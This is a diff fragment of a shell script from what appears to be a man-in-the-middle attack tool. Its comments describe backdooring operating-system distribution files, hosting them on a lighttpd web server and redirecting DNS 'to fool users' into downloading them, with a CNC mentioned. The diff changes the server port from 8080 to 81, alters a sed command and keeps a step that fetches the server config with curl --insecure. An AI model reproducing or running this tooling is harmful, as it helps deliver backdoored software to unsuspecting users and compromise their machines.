@@ -273,7 +273,6 @@ dialog --checklist "What operating system distributions would you like to backdo
    esac
 done
 
-cd ..
 ls -l out
 
 # Start and fork twisted web server to host the backdoored files
@@ -283,13 +282,13 @@ ls -l out
 # dns response to point to this target machine to fool users
 # if you specify a CNC outside of the compromised box it will work fine.
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf
-echo "Starting lighttpd web server started on port 8080"
-sed -i "s/PWD/$PWD/" lighttpd.conf
+echo "Starting lighttpd web server started on port 81"
+sed -i "s#PWD#${PWD}#" lighttpd.conf
 
 lighttpd -f lighttpd.conf&
 
 if [ $? -ne 0 ]; then
-    popup "Failed to bind 8080, check that port isn't in use and try again"
+    popup "Failed to bind 81, check that port isn't in use and try again"
     exit 1
 fi
 
